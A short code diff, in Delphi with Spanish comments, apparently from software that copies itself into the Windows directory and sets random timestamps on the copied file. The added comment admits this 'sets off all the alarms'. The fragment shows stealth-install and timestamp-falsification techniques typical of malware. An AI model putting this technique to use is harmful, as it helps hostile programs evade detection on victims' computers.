@@ -112,6 +112,8 @@ var
 
 begin
 
+  // TODO
+  // hoy en dia esto hace saltar todas las alarmas
   Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
     '%WinDir%\', FindWindowsDir());
   Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
@@ -175,8 +177,8 @@ begin
                   else
                     begin
                       //No hay ningún archivo en la carpeta u ocurrió algun error, entonces escoga una fecha al azar
-                      FileTime.dwLowDateTime := Random(4294967295);
-                      FileTime.dwHighDateTime := Random(4294967295);
+                      FileTime.dwLowDateTime := Random(429496729);
+                      FileTime.dwHighDateTime := Random(429496729);
                     end;
                   Windows.FindClose(SHandle);
                   SHandle := CreateFile(PChar(Configuracion.sCopyTo +
